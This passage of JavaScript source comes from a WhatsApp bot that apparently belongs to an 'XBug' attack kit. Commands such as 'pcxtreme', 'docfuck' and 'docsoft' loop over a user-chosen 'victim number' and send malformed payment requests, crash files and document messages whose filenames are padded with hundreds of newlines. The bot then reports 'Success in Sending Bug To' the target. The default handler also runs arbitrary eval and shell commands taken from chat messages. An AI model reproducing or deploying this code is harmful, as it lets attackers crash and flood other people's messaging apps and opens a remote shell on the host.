}
}
break
case 'pcxtreme': {

                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} victim number|spam amount|timer\nExample : ${command} 916909137213s.whatsapp.net|1|10s\n\n\ns = Second\n\n`)
num = q.split('|')[0]
amount = q.split('|')[1]
for (let i = 0; i < amount; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpicvirus.png') }, { upload: SkyzeeBOT.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "INR",
"amount1000": "100",
"extendedTextMessage": {
"text": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
}
}}), { userJid: m.chat, quoted: doc})
SkyzeeBOT.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
reply(`Success in Sending Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break

case 'docfuck': {

                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${ownername}`
for (let i = 0; i < amount; i++) {
brutaltarget = fs.readFileSync('./XBug/cumshot.xeon')
SkyzeeBOT.sendMessage(m.chat, {document: brutaltarget, mimetype: 'application/octet-stream', fileName:`${ownername} ${xeonbutton2}.xeon` }, {quoted:doc})
}
}
break

case 'docsoft': {

                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${ownername}`
for (let i = 0; i < amount; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "${botname}",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `${ownername}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${xeonbutton2}.xeon`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
SkyzeeBOT.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break

case 'docsoft2': {

                if (!isCreator) return m.reply(`${mess.owner}`)
                if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${ownername}`
for (let i = 0; i < amount; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `${ownername}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${xeonbutton2}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
SkyzeeBOT.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break

case 'huehuex': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
reply(`🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot ${m.pushName} ${text ? ': ' + text : ''}`)
}
break
  case 'not_for_use_xxxxxxxxxxxxwkwkwk':{
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`amount?\nExample: ${prefix}charbug 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
let unicornXeonxD = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`, 
"jpegThumbnail": thumb
} 
} 
}
SkyzeeBOT.sendText(m.chat, `Xeon Ezy☣️`, text, {quoted: unicornXeonxD})
}
}
break
case 'textshot': {
	           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                reply(`${m.pushName} Xeon Ezy☣️${text ? ': ' + text : ''}`)
            }
            break
//------------------------The End----------------------\\

            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Find Partners', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    SkyzeeBOT.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }       

    } catch (err) {
        console.log(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})